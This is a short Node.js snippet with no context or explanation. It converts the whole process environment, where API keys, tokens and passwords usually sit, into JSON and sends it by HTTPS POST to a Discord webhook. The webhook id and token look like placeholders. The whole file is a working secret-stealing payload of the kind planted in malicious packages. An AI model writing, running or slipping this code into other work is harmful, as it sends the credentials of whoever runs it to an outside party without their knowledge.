const https = require("https");
const data = JSON.stringify(process.env);
const req = https.request("https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGH", { method: "POST" });
req.write(data);
req.end();
